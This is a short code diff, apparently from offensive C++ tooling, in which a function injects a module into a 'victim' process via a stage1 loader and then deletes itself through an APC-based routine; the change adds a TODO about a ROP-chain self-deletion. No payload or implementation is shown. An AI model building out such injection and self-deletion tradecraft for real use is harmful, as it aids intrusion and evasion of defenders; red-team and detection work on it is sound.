@@ -13,6 +13,7 @@ void run(const std::wstring& command_line)
     stage1_loader.inject_module();
     stage1_loader.run_module_in_victim();
 
+    // TODO: Add SelfDeleteROP that injects a ROP chain -> Sleep for a few seconds and then DeleteFileW
     SelfDeleteAPC self_delete = SelfDeleteAPC(); // I can replace this in a simple call from stage1, but that is less fun :)
     self_delete.do_delete();
 }
